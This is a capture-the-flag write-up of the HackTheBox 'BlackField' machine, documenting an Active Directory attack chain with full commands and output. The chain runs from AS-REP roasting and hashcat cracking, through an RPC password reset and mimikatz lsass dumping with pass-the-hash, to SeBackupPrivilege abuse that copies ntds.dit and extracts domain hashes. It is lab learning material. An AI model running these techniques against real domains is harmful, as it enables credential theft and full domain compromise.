# BlackField - HackTheBox WriteUp

![info](/images/blackfield/info_card.png)

## Enumeration & Information Gathering
#### Scanning 

```
# Nmap 7.80 scan initiated Sun Jun  7 18:30:31 2020 as: nmap -A -p- -oA nmap/nmap_all_ports 10.10.10.192
Nmap scan report for 10.10.10.192
Host is up (0.060s latency).
Not shown: 65508 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-07 22:34:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BLACKFIELD
|   NetBIOS_Domain_Name: BLACKFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: BLACKFIELD.local
|   DNS_Computer_Name: DC01.BLACKFIELD.local
|   DNS_Tree_Name: BLACKFIELD.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-06-07T22:37:04+00:00
| ssl-cert: Subject: commonName=DC01.BLACKFIELD.local
| Not valid before: 2020-02-22T11:14:03
|_Not valid after:  2020-08-23T11:14:03
|_ssl-date: 2020-06-07T22:37:20+00:00; +7h03m14s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
50109/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/7%Time=5EDD084E%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=6/7%OT=53%CT=1%CU=32697%PV=Y%DS=2%DC=T%G=Y%TM=5EDD0965
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=U
OS:)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%
OS:O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%D
OS:F=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=
OS:Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z
OS:)

Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h03m13s, deviation: 0s, median: 7h03m13s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-07T22:37:07
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   62.68 ms 10.10.14.1
2   63.33 ms 10.10.10.192

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun  7 18:36:05 2020 -- 1 IP address (1 host up) scanned in 334.71 seconds
```
Aggressive scan did not return any futher intesreting information.

#### Service Enumeration 

**53:**

```
dig -t ns DC.01.BLACKFIELD.local

dnsenum BLACKFIELD.local

blackfield.local NS record query failed: NXDOMAIN 

dnsenum DC.01.BLACKFIELD.local

 dc.01.blackfield.local NS record query failed: NXDOMAIN   
```

Nothing interesting found from enumertating DNS. Zone transfer not possible.

**3389:**

Anonymous bind was not allowed.

```
root@kali:~/pwn_share/Machines/Bounty# ldapsearch -h 10.10.10.192 -x -b "DC=blackfield,DC=local" > ldap_out.txt 
root@kali:~/pwn_share/Machines/Bounty# cat ldap_out.txt 
# extended LDIF
#
# LDAPv3
# base <DC=blackfield,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A59, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

**445:**

```
root@kali:~/pwn_share/Machines/Blackfield# smbclient -L \\\\10.10.10.192\\Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

```

The share I'd be mostly interested in are : foresnsic and profile$

Access is denied for directory listing with anonymous access on the foresic share. ( Most likely need this after creds)

We have access to the profiles share but it appears have empty directories.


eyeballing the list of directories, a few of the names standout  audit2020, svc_backup.

Checking this directories. They appear empty.

While these directories are emtpty, they appear to be user name profiles and making a list of these usersnames is a good finding nonetheless.

```
root@kali:~/pwn_share/Machines/Blackfield/profiles# smbclient  \\\\10.10.10.192\\profiles$
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \>
smb: \> mget *
smb: \> 
```

After downloading all the files, the usernames are put into a list with a simpe bash onliner:

> root@kali:~/pwn_share/Machines/Blackfield/profiles# for i in $(ls);do echo $i; done > users.txt

**88:**

With the list of usernames, trying impacket scripts.

Specifically the GetUserSpns.py incase there are users set to not require pre authentication set

```
root@kali:/opt/impacket/examples# python3 GetNPUsers.py blackfield.local/: -request -usersfile /root/pwn_share/Machines/Blackfield/profiles/users.txt > npusers.txt

mv npusers.txt ~/pwn_share/Machines/Blackfield/


root@kali:~/pwn_share/Machines/Blackfield# cat npusers.txt 
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

$krb5asrep$23$support@BLACKFIELD.LOCAL:d9141b86bf7af57b77fea4f6dd5706e6$97624bbca77ad3024be9f732883c765e98cdfb1749494a7d854ec7d671b76b037395fff3ce88b9785ee72a7c599663795e61f1f29ec1b871d30f2f7d6f86295528bed0119c76a20f31cadab169d0fe4b67c931d6ecd2c77a1b5a4e827aecf74602581aa4ba2a856c367eab5848e888311a368a1e081348d50b1e970a09135159021f29b27b37940cdbbde885dc6d93ae7c961d1d4da1597ecc24f185e54abca6692365ec9388939c44e89c58979d4fc00e73b330e2cb5a37e8ed33fa8347ee7191563b6cf9d6938cbffb5d3791409d0fa94c12a03c8f64551d95093066fce750440472d9fc4fe71ededb21c9e4845015fab1b3e9
```

https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat


#### Foothold 
**User 1 - support:**

With the acquired krb ticket,the password can be cracked using hashcat

```
C:\Users\admin\Downloads\hashcat-5.1.0\hashcat-5.1.0>hashcat64.exe -m 18200 c:\Users\admin\Downloads\support_hash.txt c:\Users\admin\Downloads\rockyou.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: Intel(R) Corporation
========================================
* Device #1: Intel(R) HD Graphics 5500, 805/3220 MB allocatable, 24MCU
* Device #2: Intel(R) Core(TM) i7-5600U CPU @ 2.60GHz, skipped.

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Dictionary cache hit:
* Filename..: c:\Users\admin\Downloads\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5asrep$23$support@BLACKFIELD.LOCAL:d9141b86bf7af57b77fea4f6dd5706e6$97624bbca77ad3024be9f732883c765e98cdfb1749494a7d854ec7d671b76b037395fff3ce88b9785ee72a7c599663795e61f1f29ec1b871d30f2f7d6f86295528bed0119c76a20f31cadab169d0fe4b67c931d6ecd2c77a1b5a4e827aecf74602581aa4ba2a856c367eab5848e888311a368a1e081348d50b1e970a09135159021f29b27b37940cdbbde885dc6d93ae7c961d1d4da1597ecc24f185e54abca6692365ec9388939c44e89c58979d4fc00e73b330e2cb5a37e8ed33fa8347ee7191563b6cf9d6938cbffb5d3791409d0fa94c12a03c8f64551d95093066fce750440472d9fc4fe71ededb21c9e4845015fab1b3e9:#00^BlackKnight

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:d9141b86bf7a...b1b3e9
Time.Started.....: Sun Jun 07 20:20:38 2020 (1 min, 8 secs)
Time.Estimated...: Sun Jun 07 20:21:46 2020 (0 secs)
Guess.Base.......: File (c:\Users\admin\Downloads\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   212.0 kH/s (7.45ms) @ Accel:8 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 14340096/14344384 (99.97%)
Rejected.........: 0/14340096 (0.00%)
Restore.Point....: 14327808/14344384 (99.88%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $CaRaMeL -> !carolyn

Started: Sun Jun 07 20:20:37 2020
Stopped: Sun Jun 07 20:21:47 2020
```

The password was cracked (easily in less than 2 minutes with on an 8GB RAM old laptop)

> $krb5asrep$23$support@BLACKFIELD.LOCAL:d9141b86bf7af57b77fea4f6...........:**#00^BlackKnight**

Uncertain that the characters (#00^) in the password were not somehow an error, I grep the wordlist to make sure it was there

```
root@kali:~/pwn_share/Machines/Blackfield# grep "BlackKnight" /usr/share/wordlists/rockyou.txt 
#00^BlackKnight
```

**Secrets (failed):**

```
root@kali:/opt/impacket/examples# python secretsdump.py dc01.blackfield.local/support@10.10.10.192 -use-vss
Impacket v0.9.21.dev1+20200225.153700.afe746d2 - Copyright 2020 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Searching for NTDS.dit
[-] 'NoneType' object has no attribute 'request'
[*] Cleaning up...
```

**User 2 - audit2020:**

<u>**AD Password Reset**</u>

So far, the credentials obtained are 
support:#00^BlackKnight

as expected the credentials did not work with remote login using EvilWin-RM.

Going back to the shares.

The only new thing is the SYSVOL share which can now be access and listed:

```
root@kali:/tmp# smbclient \\\\10.10.10.192\\SYSVOL -U"support%#00^BlackKnight"
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Feb 23 13:13:05 2020
  ..                                  D        0  Sun Feb 23 13:13:05 2020
  BLACKFIELD.local                    D        0  Sun Feb 23 13:13:05 2020

                7846143 blocks of size 4096. 4069964 blocks available
smb: \> cd BLACKFIELD.local\
smb: \BLACKFIELD.local\> dir
  .                                   D        0  Sun Feb 23 13:19:28 2020
  ..                                  D        0  Sun Feb 23 13:19:28 2020
  DfsrPrivate                       DHS        0  Sun Feb 23 13:19:28 2020
  Policies                            D        0  Sun Feb 23 13:13:14 2020
  scripts                             D        0  Sun Feb 23 13:13:05 2020

                7846143 blocks of size 4096. 4069964 blocks available
```

Enumerating the directories, only the Policies directory is accessible and also has contents:

```
smb: \BLACKFIELD.local\> cd scripts\
smb: \BLACKFIELD.local\scripts\> dir
  .                                   D        0  Sun Feb 23 13:13:05 2020
  ..                                  D        0  Sun Feb 23 13:13:05 2020

                7846143 blocks of size 4096. 4069884 blocks available
smb: \BLACKFIELD.local\scripts\> cd ../Policies\
smb: \BLACKFIELD.local\Policies\> dir
  .                                   D        0  Sun Feb 23 13:13:14 2020
  ..                                  D        0  Sun Feb 23 13:13:14 2020
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sun Feb 23 13:13:14 2020
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sun Feb 23 13:13:14 2020

                7846143 blocks of size 4096. 4069884 blocks available
smb: \BLACKFIELD.local\Policies\> dir ../DfsrPrivate\
NT_STATUS_ACCESS_DENIED listing \BLACKFIELD.local\DfsrPrivate\
```
Downloading all the directories in the policies directory in SYSVOL:

```
smb: \BLACKFIELD.local\Policies\> recurse on
smb: \BLACKFIELD.local\Policies\> prompt off
smb: \BLACKFIELD.local\Policies\> mget *
getting file \BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 22 as GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as GptTmpl.inf (4.9 KiloBytes/sec) (average 2.4 KiloBytes/sec)
getting file \BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2796 as Registry.pol (11.4 KiloBytes/sec) (average 5.5 KiloBytes/sec)
getting file \BLACKFIELD.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as GPT.INI (0.1 KiloBytes/sec) (average 4.2 KiloBytes/sec)
getting file \BLACKFIELD.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3764 as GptTmpl.inf (16.0 KiloBytes/sec) (average 6.5 KiloBytes/sec)
```

These look like AD password policy information, the output looks pretty familiar with ad objects that had been seen when enumerating using rpcclient, but nothing more interesting.

Going back to RPC and trying a few rpc commands to enumerate domain users, sids, passsword policy etc did not yeild too much. Eventually got a hint to to try reseting the AD password. Then I wished I had searched more on google on "pentest rpcclient" or "how to enumerate. 

* https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html

* https://room362.com/post/2017/reset-ad-user-password-with-linux/

Anyway, these 2 links proved useful in understanding what needed to be done next which is resetting an AD user's password and then logging in as the user.

The target users for this attack from the list of users would audit2020 and svc_backup 

Trying to reset the password for svc_backup fails but works for audit2020.

![pass_reset](/images/blackfield/pass_reset.png)

The password can subsequently be used to login to the target

**User 3 svc_backup:**


Upon smb authentication, there are 3 folders commands_output,memory_analysis,tools. 

```
root@kali:~# smbclient \\\\10.10.10.192\\forensic -U"audit2020%Password1"
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Feb 23 15:03:16 2020
  ..                                  D        0  Sun Feb 23 15:03:16 2020
  commands_output                     D        0  Sun Feb 23 20:14:37 2020
  memory_analysis                     D        0  Thu May 28 23:28:33 2020
  tools                               D        0  Sun Feb 23 15:39:08 2020

                7846143 blocks of size 4096. 4052156 blocks available
smb: \> cd memory_analysis\

```

These appear to be be investigation files including forensic's kits and memory sample.

The memomry_analysis folder is the most interesting folder and it contails memory dummp. Amongst which is the lsass dump in a zip file. 

Lsass enforces security policies, handles passwords and creates access tokens. Since lsas is known to hold passwords in memory, a search for how to extract these passwords is performed a lot of results on how to do this using Mimikatz, or Volatility with the mimikatz module.

<u>**Mimikatz Password Extraction**</u>

After going through the article on ired.team, which shows how to extract NT hashes from an LSASS dump
https://ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz

Mimikatz was downloaded to a windows host, windows defender and virus protection disabled, and then ran with the instructed commands:
```
sekurlsa::minidump c:\users\admin\downloads\lsass.DMP 

sekurlsa::logonPasswords full
```
![mimi_lsass](/images/blackfield/mimi_lsass.png) 

Since the output was quite lenthy, a quick grep for the ntlm hashes shwow that their are only 2 distinct hashes, the first one for user svc_backup and the second for the rest of the users.

```
root@kali:~/pwn_share/Machines/Blackfield# grep -i ntlm lsass_out.txt          * NTLM     : 9658d1d1dcd9250115e2205d9f48400d
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * NTLM     : 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * NTLM     : 9658d1d1dcd9250115e2205d9f48400d
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
```

Authetication to the system is now possible using the password hash of user svc_backup via evil-winrm


evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d


And now, navigating to the Desktop folder, the user flag can be read.

![user](/images/blackfield/user.png)


## Privilege Escalation 

Checking the privileges of the current user svc_backup

> whoami /priv

The user has SeBackupPrvilege and SeRestorePrivilege.

Searching for exploits on this and trying a few suggestions: 

https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html#-sebackupprivlege---dump-ntdsdit also failed.


From reading the articles, there is an indication that a service is required for this, thereforce more research is required.

After a while discovering the ntdsutill commandline tool.

 https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)?redirectedfrom=MSDN

Then  ntbackup  https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc754423(v=ws.11)

And from there, ntbackup command is not available in Windows Vista or Windows Server 2008. Instead, you should use the wbadmin command and subcommands to back up and restore your computer and files from a command prompt.

Sounds exctly like what is needed.

Going back to the google search (sebackupprivilege privilege escalation) and found this article 

https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf

"Members of “Backup Operators” can logon locally on a Domain Controller and
backup the NTDS.DIT, for ex. with: “wbadmin.exe” or “diskshadow.exe”"



<u>**Shadow backup using  Wbadmin (failed attempt):**</u>

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin start backup -backuptarget:\\10.10.14.41\share  -include:c:\windows\ntds -quiet -nonRecurseExclude:c:\windows
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.


Note: The backed up data cannot be securely protected at this destination.
Backups stored on a remote shared folder might be accessible by other
people on the network. You should only save your backups to a location
where you trust the other users who have access to the location or on a
network that has additional security precautions in place.

Retrieving volume information...
This will back up (C:) (Selected Files) to \\10.10.14.41\share.
The backup operation to \\10.10.14.41\share is starting.
Creating a shadow copy of the volumes specified for backup...
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Creating a shadow copy of the volumes specified for backup...
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Creating a shadow copy of the volumes specified for backup...
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Windows Server Backup is updating the existing backup to remove files that have
been deleted from your server since the last backup.
This might take a few minutes.
Scanning the file system...
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Found (10) files.
Scanning the file system...
Found (10) files.
Scanning the file system...
Found (10) files.
Scanning the file system...
Found (10) files.
Creating a backup of volume (C:), copied (0%).
Creating a backup of volume (C:), copied (100%).
Creating a backup of volume (C:), copied (100%).
Summary of the backup operation:
------------------

The backup operation successfully completed.
The backup of volume (C:) completed successfully.
Log of files successfully backed up:
C:\Windows\Logs\WindowsServerBackup\Backup-12-06-2020_07-26-46.log

```

Now to restore the file, first getting the backup version identifier.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> 

wbadmin get versions                  
wbadmin 1.0 - Backup command-line tool                                               
(C) Copyright Microsoft Corporation. All rights reserved.

Backup time: 6/12/2020 12:26 AM
Backup location: Network Share labeled \\10.10.14.41\share
Version identifier: 06/12/2020-07:26
Can recover: Volume(s), File(s)
```


Then running the recovery command:

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin start recovery -version:06/12/2020-07:26 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\windows\temp\kas -notrestoreacl -quiet
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Retrieving volume information...
You have chosen to recover the file(s) c:\windows\ntds\ntds.dit from the
backup created on 6/12/2020 12:26 AM to c:\windows\temp\kas.
Preparing to recover files...

Running the recovery operation for c:\windows\ntds\ntds.dit, copied (18%).
Currently recovering c:\windows\ntds\ntds.dit.
Successfully recovered c:\windows\ntds\ntds.dit to c:\windows\temp\kas\.
The recovery operation completed.
Summary of the recovery operation:
--------------------

Recovery of c:\windows\ntds\ntds.dit to c:\windows\temp\kas\ successfully completed.
Total bytes recovered: 18.00 MB
Total files recovered: 1
Total files failed: 0

Log of files successfully recovered:
C:\Windows\Logs\WindowsServerBackup\FileRestore-12-06-2020_07-40-25.log
```

The SYSTEM registry hive should be copied as well since it contains the key to decrypt the contents of the NTDS file

```
reg save HKLM\SYSTEM system
```

Upload DSInternals to using evilwinrm's upload command, then running the commands.

```
Import-Module .\DSInternals
$key=Get-BootKey '.\system'
Access Denied!
```

Downloading the system and ntds.dit files locally to run the last steps:

```
*Evil-WinRM* PS C:\windows\temp\mine> download ntds.dit
Info: Downloading C:\windows\temp\mine\ntds.dit to ntds.dit
                                                 
Info: Download successful!

*Evil-WinRM* PS C:\windows\temp\mine> download system
Info: Downloading C:\windows\temp\mine\system to system
  
Info: Download successful!

```

Download and import DSInternals powershell module, get key from system file and decrypt password in the ntds.dit file. However, an error is throw "Checksum error on a database page"

![wbadmin_checksum](/images/blackfield/wbadmin_checksum.png)


The article mentions a second tool diskshadow.exe, in fact there are many tools that can be used to grab the shadow copy of o system, however, it's worth sticking to the recommendations in article first.

<u>**Shadow backup using Diskshadow.exe**</u>

Following the instructions the first couple of google results on "diskshadow.exe dump ntds password":

* https://pentestlab.blog/tag/diskshadow/
* https://ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration

Then creating the diskshadow.txt file and runing the diskshadow.exe command, it is noticeable that the last character in each line is snipped, adding a couple of spaces or a comment to the end of the line would ensure that all characters are sent.

diskshadow.txt:

```
set context persistent nowriters #
set metadata C:\users\svc_backup\metadata.cab #
add volume c: alias someAlias #
create #
expose %someAlias% k: #
exec cmd.exe /c copy k:\windows\ntds\ntds.dit C:\users\svc_backup\ntds.dit #
delete shadows volume %someAlias% #
reset #
```

This runs successfully until the copy \windows\ntds\ntds.dit part which fails with access denied.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow.exe /s C:\Users\svc_backup\Documents\diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  6/18/2020 5:45:46 PM

-> set context persistent nowriters
-> set metadata C:\users\svc_backup\metadata.cab
The existing file will be overwritten.
-> add volume c: alias someAlias
-> create
Alias someAlias for shadow ID {ebe619a1-52dc-4ad7-96fc-0ddbfd25eb9b} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {96d91f91-342c-4973-8376-c43b9fae45ff} set as environment variable.

Querying all shadow copies with the shadow copy set ID {96d91f91-342c-4973-8376-c43b9fae45ff}

        * Shadow copy ID = {ebe619a1-52dc-4ad7-96fc-0ddbfd25eb9b}               %someAlias%
                - Shadow copy set: {96d91f91-342c-4973-8376-c43b9fae45ff}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 6/18/2020 5:45:47 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy18
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %someAlias% k:
-> %someAlias% = {ebe619a1-52dc-4ad7-96fc-0ddbfd25eb9b}
The shadow copy was successfully exposed as k:\.
-> exec cmd.exe /c copy k:\windows\ntds\ntds.dit c:\windows\temp\ntds.dit
diskshadow.exe : Access is denied.
    + CategoryInfo          : NotSpecified: (Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
        0 file(s) copied.
The command script returned failure exit code 1.
The command script failed.
```



When trying the copy command on the cmd shell, the same error is received. This means that the file cannot be access in this way.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> copy k:\windows\ntds\ntds.dit c:\windows\temp\ntds.dit
Access to the path 'k:\windows\ntds\ntds.dit' is denied.
At line:1 char:1
+ copy k:\windows\ntds\ntds.dit c:\windows\temp\ntds.dit
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (k:\windows\ntds\ntds.dit:FileInfo) [Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand

```
The file needs to be accessed in a backup service context and not a user context.

The volume shadow was however created and we just need to find a way of copying it.

Searching further on google "SeBackupPrivilege github" 

https://github.com/giuliano108/SeBackupPrivilege

With the help of the dll's in the repo, the ntds file can be read correctly as a backup service and not interpreted as a user ( reason for the access denied error)


"If you want to read/copy data out of a "normally forbidden" folder, you have to act as a backup software. The shell copy command won't work; you'll need to open the source file manually using CreateFile making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag"


```
*Evil-WinRM* PS C:\Users\svc_backup> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc_backup> import-module .\SeBackupPrivilegeUtils.dll


Copy-FileSeBackupPrivilege r:\Windows\ntds\ntds.dit \windows\temp\ntds.dit -Overwrite
```

![copy_ntds](/images/blackfield/copy_ntds.png)

The file is subsequently downloaded to the local kali machine where the password can be extracted using the **impacket-secretsdump** and the decryption key from the SYSTEM registry.

The HKLM\SYSTEM value had aready been downloaded in the first try with wbadmin.

<u>**SecretsDump**</u>

On kali, running impacket-secretsdump:

```
impacket-secretsdump -system system -ntds ntds.dit LOCAL > secretsdump.txt
```

and checking the contents of secretsdump.txt the administrator NT hash can be found:

```
root@kali:/tmp/final# head secretsdump.txt 
Impacket v0.9.21.dev1+20200225.153700.afe746d2 - Copyright 2020 SecureAuth Corporation                                    
                                                             
[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient                        
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c                                                         
[*] Reading and decrypting hashes from ntds.dit              
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::                                    
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                            
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
```

The hash can now be used to authenticated as administrator and the root flag can be obtained.

![root](/images/blackfield/root.png)


## Conclusion

This was my first hard box on Hackthebox and I enjoyed every part of the ride, learning a lot aong the way

* I learned more rpcclient commands and how it's possible to reset a user's password without knowing it.
  
